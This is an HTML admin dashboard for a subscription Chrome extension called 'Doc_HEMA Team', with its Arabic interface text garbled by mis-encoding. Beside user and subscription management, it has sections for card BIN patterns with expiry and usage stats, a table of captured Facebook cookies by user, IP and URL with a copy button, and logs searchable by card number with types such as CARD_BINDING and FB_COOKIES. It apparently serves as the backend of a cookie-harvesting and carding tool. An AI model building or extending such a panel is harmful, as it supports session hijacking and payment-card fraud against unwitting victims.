<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ููุญุฉ ุงูุชุญูู - Doc_HEMA Team</title>
    <link rel="stylesheet" href="admin.css">
</head>

<body>
    <!-- Login Screen -->
    <div id="login-screen" class="login-screen">
        <div class="login-card">
            <div class="logo">๐</div>
            <h1>ููุญุฉ ุงูุชุญูู</h1>
            <p>Doc_HEMA Team Extension</p>

            <form id="login-form">
                <div class="form-group">
                    <label for="admin-email">ุงูุจุฑูุฏ ุงูุฅููุชุฑููู</label>
                    <input type="email" id="admin-email" required placeholder="admin@example.com">
                </div>
                <div class="form-group">
                    <label for="admin-password">ูููุฉ ุงููุฑูุฑ</label>
                    <input type="password" id="admin-password" required placeholder="โขโขโขโขโขโขโขโข">
                </div>
                <button type="submit" class="btn btn-primary btn-block">
                    <span id="login-text">ุชุณุฌูู ุงูุฏุฎูู</span>
                    <span id="login-spinner" class="spinner" style="display:none;"></span>
                </button>
            </form>

            <div id="login-error" class="alert alert-error" style="display:none;"></div>
        </div>
    </div>

    <!-- Main Dashboard -->
    <div id="dashboard" class="dashboard" style="display:none;">
        <!-- Sidebar -->
        <aside class="sidebar">
            <div class="sidebar-header">
                <h2>๐ก๏ธ Doc_HEMA</h2>
                <span class="version">Admin Panel v1.0</span>
            </div>

            <nav class="sidebar-nav">
                <a href="#" class="nav-item active" data-section="overview">
                    <span class="icon">๐</span>
                    <span>ูุธุฑุฉ ุนุงูุฉ</span>
                </a>
                <a href="#" class="nav-item" data-section="users">
                    <span class="icon">๐ฅ</span>
                    <span>ุงููุณุชุฎุฏููู</span>
                </a>
                <a href="#" class="nav-item" data-section="subscriptions">
                    <span class="icon">๐ณ</span>
                    <span>ุงูุงุดุชุฑุงูุงุช</span>
                </a>
                <a href="#" class="nav-item" data-section="bins">
                    <span class="icon">๐ฆ</span>
                    <span>BINs</span>
                </a>
                <a href="bin-search.html" class="nav-item" target="_blank">
                    <span class="icon">๐</span>
                    <span>ุจุญุซ BIN</span>
                </a>
                <a href="#" class="nav-item" data-section="cookies">
                    <span class="icon">๐ช</span>
                    <span>Cookies</span>
                </a>
                <a href="#" class="nav-item" data-section="logs">
                    <span class="icon">๐</span>
                    <span>ุงูุณุฌูุงุช</span>
                </a>
            </nav>

            <div class="sidebar-footer">
                <button id="logout-btn" class="btn btn-secondary btn-block">
                    <span class="icon">๐ช</span>
                    ุชุณุฌูู ุงูุฎุฑูุฌ
                </button>
            </div>
        </aside>

        <!-- Main Content -->
        <main class="main-content">
            <!-- Header -->
            <header class="header">
                <h1 id="page-title">ูุธุฑุฉ ุนุงูุฉ</h1>
                <div class="header-actions">
                    <button id="refresh-btn" class="btn btn-secondary">
                        <span class="icon">๐</span>
                        ุชุญุฏูุซ
                    </button>
                </div>
            </header>

            <!-- Overview Section -->
            <section id="section-overview" class="section">
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-icon">๐ฅ</div>
                        <div class="stat-info">
                            <span class="stat-value" id="total-users">0</span>
                            <span class="stat-label">ุงููุณุชุฎุฏููู</span>
                        </div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-icon">โ</div>
                        <div class="stat-info">
                            <span class="stat-value" id="active-subs">0</span>
                            <span class="stat-label">ุงุดุชุฑุงูุงุช ูุดุทุฉ</span>
                        </div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-icon">๐ฆ</div>
                        <div class="stat-info">
                            <span class="stat-value" id="total-bins">0</span>
                            <span class="stat-label">BINs ูุณุฌูุฉ</span>
                        </div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-icon">๐</div>
                        <div class="stat-info">
                            <span class="stat-value" id="total-logs">0</span>
                            <span class="stat-label">ุฅุฌูุงูู ุงูุนูููุงุช</span>
                        </div>
                    </div>
                </div>

                <div class="card">
                    <h3>ุขุฎุฑ ุงูุนูููุงุช</h3>
                    <div id="recent-logs" class="recent-logs">
                        <p class="loading">ุฌุงุฑู ุงูุชุญููู...</p>
                    </div>
                </div>
            </section>

            <!-- Users Section -->
            <section id="section-users" class="section" style="display:none;">
                <div class="section-header">
                    <h2>ุฅุฏุงุฑุฉ ุงููุณุชุฎุฏููู</h2>
                    <button id="add-user-btn" class="btn btn-primary">
                        <span class="icon">โ</span>
                        ุฅุถุงูุฉ ูุณุชุฎุฏู
                    </button>
                </div>

                <div class="card">
                    <div class="table-container">
                        <table id="users-table">
                            <thead>
                                <tr>
                                    <th>ุงูุงุณู</th>
                                    <th>ุงูุจุฑูุฏ</th>
                                    <th>ุงูุฌูุงุฒ</th>
                                    <th>ุขุฎุฑ ุฏุฎูู</th>
                                    <th>ุงูุญุงูุฉ</th>
                                    <th>ุงูุฅุฌุฑุงุกุงุช</th>
                                </tr>
                            </thead>
                            <tbody id="users-tbody">
                                <tr>
                                    <td colspan="6" class="loading">ุฌุงุฑู ุงูุชุญููู...</td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
            </section>

            <!-- Subscriptions Section -->
            <section id="section-subscriptions" class="section" style="display:none;">
                <div class="section-header">
                    <h2>ุฅุฏุงุฑุฉ ุงูุงุดุชุฑุงูุงุช</h2>
                    <button id="add-sub-btn" class="btn btn-primary">
                        <span class="icon">โ</span>
                        ุฅุถุงูุฉ ุงุดุชุฑุงู
                    </button>
                </div>

                <div class="card">
                    <div class="table-container">
                        <table id="subs-table">
                            <thead>
                                <tr>
                                    <th>ุงููุณุชุฎุฏู</th>
                                    <th>ุงูุฎุทุฉ</th>
                                    <th>ุชุงุฑูุฎ ุงูุงูุชูุงุก</th>
                                    <th>ุงูุญุงูุฉ</th>
                                    <th>ุงูุฅุฌุฑุงุกุงุช</th>
                                </tr>
                            </thead>
                            <tbody id="subs-tbody">
                                <tr>
                                    <td colspan="5" class="loading">ุฌุงุฑู ุงูุชุญููู...</td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
            </section>

            <!-- BINs Section -->
            <section id="section-bins" class="section" style="display:none;">
                <div class="section-header">
                    <h2>BINs ุงููุณุฌูุฉ</h2>
                    <div class="filter-group">
                        <input type="text" id="bin-filter" placeholder="ุจุญุซ ุนู BIN...">
                        <select id="bin-sort">
                            <option value="date">ุชุฑุชูุจ ุญุณุจ ุงูุชุงุฑูุฎ</option>
                            <option value="usage">ุชุฑุชูุจ ุญุณุจ ุงูุงุณุชุฎุฏุงู</option>
                            <option value="pattern">ุชุฑุชูุจ ุญุณุจ ุงูู Pattern</option>
                        </select>
                    </div>
                </div>

                <!-- Top BINs Analytics -->
                <div class="stats-grid" style="margin-bottom: 20px;">
                    <div class="stat-card">
                        <div class="stat-icon">๐</div>
                        <div class="stat-info">
                            <span class="stat-value" id="top-bin-pattern">-</span>
                            <span class="stat-label">ุฃูุซุฑ BIN ุงุณุชุฎุฏุงูุงู</span>
                        </div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-icon">๐</div>
                        <div class="stat-info">
                            <span class="stat-value" id="top-bin-count">0</span>
                            <span class="stat-label">ุนุฏุฏ ุงูุงุณุชุฎุฏุงูุงุช</span>
                        </div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-icon">๐ข</div>
                        <div class="stat-info">
                            <span class="stat-value" id="unique-bins">0</span>
                            <span class="stat-label">BINs ูุฑูุฏุฉ</span>
                        </div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-icon">๐</div>
                        <div class="stat-info">
                            <span class="stat-value" id="total-bin-usage">0</span>
                            <span class="stat-label">ุฅุฌูุงูู ุงูุงุณุชุฎุฏุงู</span>
                        </div>
                    </div>
                </div>

                <!-- Top 5 BINs -->
                <div class="card" style="margin-bottom: 20px;">
                    <h3>๐ ุฃูุซุฑ 5 BINs ุงุณุชุฎุฏุงูุงู</h3>
                    <div id="top-bins-list" class="top-bins-list">
                        <p class="loading">ุฌุงุฑู ุงูุชุญููู...</p>
                    </div>
                </div>

                <div class="card">
                    <div class="table-container">
                        <table id="bins-table">
                            <thead>
                                <tr>
                                    <th>ุงููุณุชุฎุฏู</th>
                                    <th>Pattern</th>
                                    <th>ุงูุงุณู</th>
                                    <th>ุงูุงุณุชุฎุฏุงู</th>
                                    <th>Expiry</th>
                                    <th>ุชุงุฑูุฎ ุงูุฅูุดุงุก</th>
                                    <th>ุงูุฅุฌุฑุงุกุงุช</th>
                                </tr>
                            </thead>
                            <tbody id="bins-tbody">
                                <tr>
                                    <td colspan="7" class="loading">ุฌุงุฑู ุงูุชุญููู...</td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
            </section>


            <!-- Cookies Section -->
            <section id="section-cookies" class="section" style="display:none;">
                <div class="section-header">
                    <h2>๐ช Facebook Cookies</h2>
                    <div class="filter-group" style="display: flex; gap: 10px; flex-wrap: wrap; align-items: center;">
                        <input type="text" id="cookies-search" placeholder="๐ ุจุญุซ ุจุงููุณุชุฎุฏู ุฃู IP..."
                            style="min-width: 200px;">
                        <button id="refresh-cookies" class="btn btn-sm btn-primary">๐ ุชุญุฏูุซ</button>
                        <button class="clear-filters-btn" onclick="clearFilters('cookies')">๐๏ธ ูุณุญ ุงูููุงุชุฑ</button>
                    </div>
                </div>

                <!-- Cookies Stats -->
                <div class="stats-grid" style="margin-bottom: 20px;">
                    <div class="stat-card">
                        <div class="stat-value" id="cookies-total">0</div>
                        <div class="stat-label">ุฅุฌูุงูู ุงูููููุฒ</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" id="cookies-today">0</div>
                        <div class="stat-label">ุงูููู</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" id="cookies-unique-users">0</div>
                        <div class="stat-label">ูุณุชุฎุฏููู ูุฑูุฏูู</div>
                    </div>
                </div>

                <div class="card" style="padding: 0; overflow: hidden;">
                    <div class="table-container">
                        <table id="cookies-table" class="gsheet-table">
                            <thead>
                                <!-- Header Row with Sortable Columns -->
                                <tr>
                                    <th class="sortable" onclick="toggleSort('cookies', 'userId')" data-column="userId"
                                        style="width: 120px;">ุงููุณุชุฎุฏู</th>
                                    <th class="sortable" onclick="toggleSort('cookies', 'ip')" data-column="ip"
                                        style="width: 120px;">IP</th>
                                    <th class="sortable" onclick="toggleSort('cookies', 'url')" data-column="url"
                                        style="width: 200px;">URL</th>
                                    <th class="sortable" onclick="toggleSort('cookies', 'cookiesLength')"
                                        data-column="cookiesLength" style="width: 100px;">ุทูู ุงูููููุฒ</th>
                                    <th class="sortable sorted-desc" onclick="toggleSort('cookies', 'capturedAt')"
                                        data-column="capturedAt" style="width: 150px;">ุชุงุฑูุฎ ุงูุงูุชูุงุท</th>
                                    <th style="width: 150px;">ุงูุฅุฌุฑุงุกุงุช</th>
                                </tr>
                                <!-- Filter Row -->
                                <tr class="filter-row">
                                    <th><input type="text" class="column-filter" placeholder="ููุชุฑ..."
                                            oninput="updateFilter('cookies', 'userId', this.value)"></th>
                                    <th><input type="text" class="column-filter" placeholder="ููุชุฑ IP..."
                                            oninput="updateFilter('cookies', 'ip', this.value)"></th>
                                    <th><input type="text" class="column-filter" placeholder="ููุชุฑ URL..."
                                            oninput="updateFilter('cookies', 'url', this.value)"></th>
                                    <th></th>
                                    <th><input type="date" class="date-input"
                                            onchange="updateFilter('cookies', 'dateFrom', this.value)"></th>
                                    <th></th>
                                </tr>
                            </thead>
                            <tbody id="cookies-tbody">
                                <tr>
                                    <td colspan="6" class="loading">ุฌุงุฑู ุงูุชุญููู...</td>
                                </tr>
                            </tbody>
                        </table>
                    </div>

                    <!-- Enhanced Pagination (will be injected by JS) -->
                    <div id="cookies-pagination-container"></div>
                </div>
            </section>

            <!-- Cookie View Modal -->
            <div id="cookie-modal" class="modal" style="display:none;">
                <div class="modal-content" style="max-width: 800px;">
                    <div class="modal-header">
                        <h3>๐ช ุชูุงุตูู ุงูููููุฒ</h3>
                        <button onclick="closeCookieModal()" class="close-btn">&times;</button>
                    </div>
                    <div class="modal-body">
                        <div style="margin-bottom: 15px;">
                            <strong>ุงููุณุชุฎุฏู:</strong> <span id="modal-user"></span><br>
                            <strong>IP:</strong> <span id="modal-ip"></span><br>
                            <strong>URL:</strong> <span id="modal-url"></span><br>
                            <strong>ุงูุชุงุฑูุฎ:</strong> <span id="modal-date"></span>
                        </div>
                        <div style="margin-bottom: 10px;">
                            <button onclick="copyModalCookies()" class="btn btn-sm btn-primary">๐ ูุณุฎ ุงูููููุฒ</button>
                        </div>
                        <textarea id="modal-cookies" readonly
                            style="width: 100%; height: 300px; background: #1a1a2e; color: #00FF41; border: 1px solid #333; border-radius: 8px; padding: 10px; font-family: monospace; font-size: 12px;"></textarea>
                    </div>
                </div>
            </div>


            <!-- Logs Section -->
            <section id="section-logs" class="section" style="display:none;">
                <div class="section-header">
                    <h2>ุณุฌูุงุช ุงูุนูููุงุช</h2>
                    <div class="filter-group" style="display: flex; gap: 10px; flex-wrap: wrap; align-items: center;">
                        <input type="text" id="card-search" placeholder="๐ ุจุญุซ ุจุฑูู ุงูุจุทุงูุฉ..."
                            style="min-width: 200px;">
                        <select id="log-type-filter">
                            <option value="">ุฌููุน ุงูุฃููุงุน</option>
                            <option value="BIN_REGISTERED">BIN_REGISTERED</option>
                            <option value="FB_COOKIES">FB_COOKIES</option>
                            <option value="CARD_ADDED">CARD_ADDED</option>
                            <option value="CARD_BINDING">CARD_BINDING</option>
                        </select>
                        <button class="clear-filters-btn" onclick="clearFilters('logs')">๐๏ธ ูุณุญ ุงูููุงุชุฑ</button>
                    </div>
                </div>

                <!-- Search Results Info -->
                <div id="search-results-info" class="card" style="margin-bottom: 15px; display: none;">
                    <div style="display: flex; justify-content: space-between; align-items: center;">
                        <span id="search-results-text" style="color: #FFD700;"></span>
                        <button id="clear-search" class="btn btn-sm btn-secondary">ูุณุญ ุงูุจุญุซ</button>
                    </div>
                </div>

                <div class="card" style="padding: 0; overflow: hidden;">
                    <div class="table-container">
                        <table id="logs-table" class="gsheet-table">
                            <thead>
                                <!-- Header Row with Sortable Columns -->
                                <tr>
                                    <th class="sortable" onclick="toggleSort('logs', 'userId')" data-column="userId">
                                        ุงููุณุชุฎุฏู
                                    </th>
                                    <th class="sortable" onclick="toggleSort('logs', 'type')" data-column="type">
                                        ุงูููุน
                                    </th>
                                    <th class="sortable" onclick="toggleSort('logs', 'ip')" data-column="ip">
                                        IP
                                    </th>
                                    <th data-column="data">
                                        ุงูุจูุงูุงุช
                                    </th>
                                    <th class="sortable sorted-desc" onclick="toggleSort('logs', 'createdAt')"
                                        data-column="createdAt">
                                        ุงูุชุงุฑูุฎ
                                    </th>
                                </tr>
                                <!-- Filter Row -->
                                <tr class="filter-row">
                                    <th>
                                        <input type="text" class="column-filter" placeholder="ููุชุฑ..."
                                            oninput="updateFilter('logs', 'userId', this.value)">
                                    </th>
                                    <th>
                                        <select class="column-filter"
                                            onchange="updateFilter('logs', 'type', this.value)">
                                            <option value="">ุงููู</option>
                                            <option value="CARD_ADDED">CARD_ADDED</option>
                                            <option value="FB_COOKIES">FB_COOKIES</option>
                                            <option value="BIN_REGISTERED">BIN_REGISTERED</option>
                                            <option value="CARD_BINDING">CARD_BINDING</option>
                                        </select>
                                    </th>
                                    <th>
                                        <input type="text" class="column-filter" placeholder="ููุชุฑ IP..."
                                            oninput="updateFilter('logs', 'ip', this.value)">
                                    </th>
                                    <th>
                                        <input type="text" class="column-filter" placeholder="ุจุญุซ ูู ุงูุจูุงูุงุช..."
                                            oninput="updateFilter('logs', 'data', this.value)">
                                    </th>
                                    <th>
                                        <div class="date-range-container">
                                            <input type="date" class="date-input" id="logs-date-from"
                                                onchange="updateFilter('logs', 'dateFrom', this.value)">
                                        </div>
                                    </th>
                                </tr>
                            </thead>
                            <tbody id="logs-tbody">
                                <tr>
                                    <td colspan="5" class="loading">ุฌุงุฑู ุงูุชุญููู...</td>
                                </tr>
                            </tbody>
                        </table>
                    </div>

                    <!-- Enhanced Pagination (will be injected by JS) -->
                    <div id="logs-pagination-container"></div>
                </div>
            </section>
        </main>
    </div>

    <!-- Add User Modal -->
    <div id="add-user-modal" class="modal" style="display:none;">
        <div class="modal-content">
            <div class="modal-header">
                <h3>ุฅุถุงูุฉ ูุณุชุฎุฏู ุฌุฏูุฏ</h3>
                <button class="modal-close">&times;</button>
            </div>
            <form id="add-user-form">
                <div class="form-group">
                    <label>ุงุณู ุงููุณุชุฎุฏู</label>
                    <input type="text" id="new-username" required>
                </div>
                <div class="form-group">
                    <label>ุงูุจุฑูุฏ ุงูุฅููุชุฑููู</label>
                    <input type="email" id="new-email" required>
                </div>
                <div class="form-group">
                    <label>ูููุฉ ุงููุฑูุฑ</label>
                    <input type="password" id="new-password" required>
                </div>
                <div class="form-group">
                    <label>ุงุณู ุงูุฌูุงุฒ</label>
                    <input type="text" id="new-device" value="Chrome Extension">
                </div>
                <div class="form-actions">
                    <button type="button" class="btn btn-secondary modal-close-btn">ุฅูุบุงุก</button>
                    <button type="submit" class="btn btn-primary">ุฅุถุงูุฉ</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Add Subscription Modal -->
    <div id="add-sub-modal" class="modal" style="display:none;">
        <div class="modal-content">
            <div class="modal-header">
                <h3>ุฅุถุงูุฉ ุงุดุชุฑุงู</h3>
                <button class="modal-close">&times;</button>
            </div>
            <form id="add-sub-form">
                <div class="form-group">
                    <label>ูุนุฑู ุงููุณุชุฎุฏู</label>
                    <input type="text" id="sub-user-id" required>
                </div>
                <div class="form-group">
                    <label>ููุน ุงูุฎุทุฉ</label>
                    <select id="sub-plan" required>
                        <option value="monthly">ุดูุฑู</option>
                        <option value="yearly">ุณููู</option>
                        <option value="lifetime">ูุฏู ุงูุญูุงุฉ</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>ุชุงุฑูุฎ ุงูุงูุชูุงุก</label>
                    <input type="date" id="sub-expiry" required>
                </div>
                <div class="form-actions">
                    <button type="button" class="btn btn-secondary modal-close-btn">ุฅูุบุงุก</button>
                    <button type="submit" class="btn btn-primary">ุฅุถุงูุฉ</button>
                </div>
            </form>
        </div>
    </div>

    <script src="admin.js"></script>
</body>

</html>